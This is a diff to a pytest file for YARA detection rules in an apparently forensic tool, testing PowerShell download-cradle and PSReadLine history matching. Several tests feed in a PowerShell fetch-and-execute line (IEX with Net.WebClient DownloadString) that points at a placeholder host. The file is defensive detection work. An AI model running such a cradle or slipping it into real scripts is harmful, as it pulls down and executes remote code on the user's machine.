@@ -75,6 +75,8 @@ def test_cradle_not_applied_to_psreadline_history(rules):
     cradle = b"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"
     path = "Users/a/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt"
     assert "INV_PowerShell_Download_Cradle" not in matched(rules, cradle, path)
+    assert "INV_PowerShell_Download_Cradle_History" in matched(rules, cradle, path)
+    assert "INV_PowerShell_Download_Cradle_History" not in matched(rules, cradle, "Users/a/Downloads/x.ps1")
     assert "INV_PowerShell_Download_Cradle" in matched(rules, cradle, "Users/a/Downloads/x.ps1")
 
 
@@ -83,3 +85,35 @@ def test_all_rule_names_use_prefix(rules):
     import re
 
     assert all(n.startswith("INV_") for n in re.findall(r"^rule (\w+)", text, re.M))
+
+
+@pytest.mark.parametrize("path", [
+    "Users/a/Downloads/psreadline/evil.ps1",
+    "Users/a/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/evil.ps1",
+    "Users/a/psreadline_history.txt",
+])
+def test_decoy_psreadline_path_is_still_matched(rules, path):
+    cradle = b"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"
+    found = matched(rules, cradle, path)
+    assert "INV_PowerShell_Download_Cradle" in found
+    assert "INV_PowerShell_Download_Cradle_History" not in found
+
+
+def test_path_with_lone_surrogate_is_still_scanned(rules):
+    from investigation.modules.parsers.yara_scan import match_file
+
+    cradle = b"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"
+    got = {m.rule for m in match_file(rules, cradle, "Users/a/Downloads/bad\udcff.ps1")}
+    assert "INV_PowerShell_Download_Cradle" in got
+
+
+def test_unencodable_external_falls_back_to_empty_path(rules):
+    from investigation.modules.parsers.yara_scan import match_file
+
+    class Picky:
+        def match(self, data, timeout, externals):
+            if externals["filepath"]:
+                raise ValueError("bad external")
+            return ["ok"]
+
+    assert match_file(Picky(), b"x", "p") == ["ok"]
